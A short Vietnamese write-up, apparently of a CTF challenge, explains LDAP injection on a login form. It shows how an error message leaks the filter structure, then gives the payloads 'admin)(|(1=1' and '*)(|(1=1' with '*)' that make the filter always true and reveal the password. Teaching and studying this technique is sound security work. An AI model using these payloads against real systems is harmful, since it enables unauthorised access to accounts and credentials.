Đọc doc về LDAP, mình hiểu đại khái nó là 1 filter cho database. Thử nhập vào ô username 1 kí tự đặc biệt trong LDAP như `)` để xem output:

> ERROR : Invalid LDAP syntax : (&(uid=a))(userPassword=))

Vậy câu query của nó như sau:

`(&(uid= [username])(userPassword=[password]))`

Thủ thuật inject vào LDAP cũng giống như inject vào sql: làm sao để câu điều kiện luôn đúng, chỉ cần chú ý cú pháp là được. Thử với input như sau:

`username: admin)(|(1=1`

`password: 123)`

Ý tưởng là biến câu query thành:

`(&(uid= admin)(|(1=1)(userPassword=123)))`

Nhưng vẫn không đúng, vậy khả năng username không nhất thiết phải là admin. Ta cho username và password là bất chuỗi kí tự nào:

`username: *)(|(1=1`

`password: *)`

và sẽ lấy được password